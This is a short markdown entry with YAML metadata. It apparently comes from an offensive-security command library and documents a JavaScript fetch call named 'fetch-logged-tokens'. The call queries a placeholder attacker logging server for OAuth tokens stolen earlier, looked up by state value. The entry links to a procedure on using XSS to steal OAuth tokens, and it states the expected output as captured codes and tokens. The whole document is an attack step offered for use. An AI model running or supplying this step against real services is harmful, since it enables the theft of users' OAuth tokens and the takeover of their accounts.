---
data: >-
  fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q='+ st).then(e=>
  e.text()).then(e=>{...});
tags:
  - fetch
  - logging
type: command
executor: javascript
platforms:
  - Web
id: d24c46d0-adfd-48e7-b7b4-e488463c10a6
created_at: '2025-12-11T06:10:22.334Z'
updated_at: '2025-12-11T06:10:22.334Z'
verified: false
validated: true
submitted: true
---
# fetch-logged-tokens

## Command

```javascript
fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q='+ st).then(e=> e.text()).then(e=>{...});
```

## Description

Fetches logged data from the attacker's server to retrieve stolen OAuth tokens based on state.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `q` | State value to query logs | Yes |

## Examples

### Basic Usage

```javascript
fetch('https://example.com/parse.php?q=state123').then(e=> e.text()).then(e=>{console.log(e);});
```

## Expected Output

Logged payload containing code and tokens.

## Related

- [[procedures/Exploit-XSS-to-Steal-OAuth-Tokens]]
